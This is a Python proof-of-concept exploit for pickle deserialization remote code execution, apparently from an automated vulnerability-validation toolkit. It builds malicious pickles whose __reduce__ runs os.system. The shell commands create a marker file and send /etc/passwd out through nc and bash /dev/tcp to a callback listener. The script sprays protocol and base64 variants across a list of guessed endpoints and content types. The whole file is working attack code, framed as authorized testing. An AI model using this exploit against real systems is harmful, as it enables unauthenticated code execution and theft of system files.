#!/usr/bin/env python3
"""
PoC: Pickle Deserialization RCE — Python Targets Only

Vulnerability: A network-accessible endpoint deserializes user-supplied data
using pickle.loads() (or dill.loads() / cloudpickle.loads()) without
validation. The __reduce__ method in a malicious pickle payload is called
unconditionally during deserialization, yielding arbitrary OS command execution
as the web server process user.

Language gate: PYTHON TARGETS ONLY — pickle is a Python-only serialization
format. Java, Go, and TypeScript applications cannot be affected by this class.

CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
      Unauthenticated network RCE if endpoint is public.

Validation strategy:
  - Malicious pickle payload executes: touch /tmp/pickle_rce_<id>
  - Marker file is checked via docker exec after injection
  - TCP listener on port 59875 provides OOB confirmation when possible

Usage (authorized testing only, inside Docker):
    python poc_pickle_deserialization_001.py --target http://localhost:5000 --timeout 30

Exit codes:
    0 - CONFIRMED: Marker file created (RCE confirmed)
    1 - NOT_REPRODUCED: No evidence of RCE within timeout
    2 - ERROR: Script error or target unreachable

IMPORTANT: Only use against systems you have explicit written authorization
to test. For Python targets only.
"""

import argparse
import base64
import io
import os
import pickle
import socket
import struct
import sys
import threading
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] PICKLE-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "PICKLE-001"
CALLBACK_PORT = 59875


# ── Malicious pickle builder ───────────────────────────────────────────────────

class _PickleExploit:
    """Serialize this object to a pickle that runs `cmd` upon deserialization."""

    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build_pickle_payload(marker_id: str, callback_host: str = "127.0.0.1") -> bytes:
    """Build a pickle payload that writes a marker file and optionally calls back."""
    marker_path = f"/tmp/pickle_rce_{marker_id}"
    cmd = (
        f"touch {marker_path} && "
        f"(cat /etc/passwd | nc -w1 {callback_host} {CALLBACK_PORT} 2>/dev/null || "
        f"bash -c 'cat /etc/passwd >/dev/tcp/{callback_host}/{CALLBACK_PORT}' 2>/dev/null || true)"
    )
    return pickle.dumps(_PickleExploit(cmd))


def build_protocol_variants(marker_id: str, callback_host: str = "127.0.0.1") -> list[tuple[str, bytes]]:
    """
    Return multiple pickle variants — different protocols and encodings.
    Some targets only accept specific protocols or encodings.
    """
    marker_path = f"/tmp/pickle_rce_{marker_id}"
    simple_cmd = f"touch {marker_path}"
    full_cmd = (
        f"touch {marker_path}; "
        f"cat /etc/passwd | nc -w1 {callback_host} {CALLBACK_PORT} 2>/dev/null; true"
    )

    variants = []

    # Protocol 0-5 variants (default, 2, 5)
    for proto in (0, 2, 5):
        try:
            raw = pickle.dumps(_PickleExploit(full_cmd), protocol=proto)
            variants.append((f"pickle-protocol-{proto}", raw))
        except Exception:
            pass

    # Base64-encoded variants (some apps decode before deserializing)
    for proto in (0, 2):
        try:
            raw = pickle.dumps(_PickleExploit(full_cmd), protocol=proto)
            variants.append((f"pickle-protocol-{proto}-b64", base64.b64encode(raw)))
        except Exception:
            pass

    # Try dill / cloudpickle if available (broader gadget support)
    for lib_name in ("dill", "cloudpickle"):
        try:
            lib = __import__(lib_name)
            raw = lib.dumps(_PickleExploit(full_cmd))
            variants.append((f"{lib_name}-payload", raw))
        except ImportError:
            pass
        except Exception:
            pass

    return variants


# ── TCP callback listener ──────────────────────────────────────────────────────

class CallbackListener:
    def __init__(self, port: int):
        self.port = port
        self.received = False
        self.data = b""
        self._server: socket.socket | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> bool:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._server.bind(("0.0.0.0", self.port))
            self._server.listen(5)
            self._server.settimeout(1.0)
        except OSError as e:
            print(f"[!] {VULN_ID}: Could not bind port {self.port}: {e}")
            return False
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        return True

    def _accept_loop(self) -> None:
        while not self.received:
            try:
                conn, _addr = self._server.accept()
                self.data = conn.recv(4096)
                self.received = True
                conn.close()
            except socket.timeout:
                continue
            except Exception:
                break

    def stop(self) -> None:
        if self._server:
            self._server.close()

    def wait_for_callback(self, timeout: float) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.received:
                return True
            time.sleep(0.2)
        return False


# ── Injection engine ───────────────────────────────────────────────────────────

# Endpoints that commonly deserialize user data in Python webapps
INJECTION_ENDPOINTS = [
    "/",
    "/api/load",
    "/api/deserialize",
    "/api/restore",
    "/api/session",
    "/api/data",
    "/load",
    "/restore",
    "/deserialize",
    "/session/load",
    "/pickle",
]

# Content-type headers to try for binary pickle payloads
CONTENT_TYPES = [
    "application/octet-stream",
    "application/x-pickle",
    "application/pickle",
    "application/python-pickle",
]


def inject_pickle(
    session: requests.Session,
    target: str,
    variants: list[tuple[str, bytes]],
    timeout: int,
) -> bool:
    """Send all pickle variants to all endpoints. Returns True if any request succeeded."""
    sent = False
    for desc, payload in variants:
        is_b64 = desc.endswith("-b64")

        for endpoint in INJECTION_ENDPOINTS:
            url = target.rstrip("/") + endpoint

            if is_b64:
                # Some apps accept base64 in JSON body
                for field in ("data", "payload", "session", "object"):
                    try:
                        session.post(
                            url,
                            json={field: payload.decode()},
                            timeout=5,
                            allow_redirects=False,
                        )
                        sent = True
                    except RequestException:
                        pass
            else:
                # Raw binary — try multiple content-types
                for ctype in CONTENT_TYPES:
                    try:
                        session.post(
                            url,
                            data=payload,
                            headers={"Content-Type": ctype},
                            timeout=5,
                            allow_redirects=False,
                        )
                        sent = True
                    except RequestException:
                        pass
                # Also try as multipart file upload
                try:
                    session.post(
                        url,
                        files={"file": ("data.pkl", io.BytesIO(payload), "application/octet-stream")},
                        timeout=5,
                        allow_redirects=False,
                    )
                    sent = True
                except RequestException:
                    pass

    return sent


# ── Main exploit logic ─────────────────────────────────────────────────────────

def run_exploit(target: str, timeout: int) -> tuple[int, dict]:
    import secrets
    marker_id = secrets.token_hex(8)
    marker_path = f"/tmp/pickle_rce_{marker_id}"

    print(f"[*] {VULN_ID}: Pickle Deserialization RCE PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Marker ID: {marker_id}")
    print(f"[*] {VULN_ID}: Marker path: {marker_path}")
    print(f"[*] {VULN_ID}: OOB TCP listener on port {CALLBACK_PORT}")

    listener = CallbackListener(CALLBACK_PORT)
    if not listener.start():
        print(f"[WARN] {VULN_ID}: Could not start TCP listener — OOB detection disabled")

    session = requests.Session()

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=10)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        listener.stop()
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    # Build all payload variants
    variants = build_protocol_variants(marker_id)
    print(
        f"[*] {VULN_ID}: Sending {len(variants)} pickle variants "
        f"across {len(INJECTION_ENDPOINTS)} endpoints x {len(CONTENT_TYPES)} content-types..."
    )

    inject_pickle(session, target, variants, timeout)

    # Phase 1: OOB callback (fastest confirmation)
    wait_time = min(timeout, 8)
    print(f"[*] {VULN_ID}: Waiting {wait_time}s for OOB TCP callback...")
    oob = listener.wait_for_callback(wait_time)
    listener.stop()

    if oob:
        evidence = (
            f"OOB TCP callback received on port {CALLBACK_PORT}; "
            f"data: {listener.data[:64]!r}"
        )
        print(f"[CONFIRMED] {VULN_ID}: Pickle RCE confirmed via OOB callback!")
        print(f"[CONFIRMED] {VULN_ID}: {evidence}")
        return 0, {
            "marker_id": marker_id,
            "marker_path": marker_path,
            "evidence": evidence,
            "callback_data": str(listener.data),
        }

    # Phase 2: Check marker file via docker exec (done externally by validator)
    print(f"[-] {VULN_ID}: No OOB callback received within {wait_time}s")
    print(
        f"[*] {VULN_ID}: Validate marker file: "
        f"docker exec <container> ls {marker_path}"
    )
    print(
        f"[*] {VULN_ID}: Check for pickle.loads() / dill.loads() receiving "
        f"HTTP body/file upload data in the target source"
    )
    return 1, {"marker_id": marker_id, "marker_path": marker_path}


def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"PoC for Pickle Deserialization RCE ({VULN_ID}) — Python targets only",
        epilog="For authorized security testing of Python applications only.",
    )
    parser.add_argument("--target", default="http://localhost:5000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: Pickle deserialization RCE confirmed (CVSS 9.8)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Pickle RCE not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
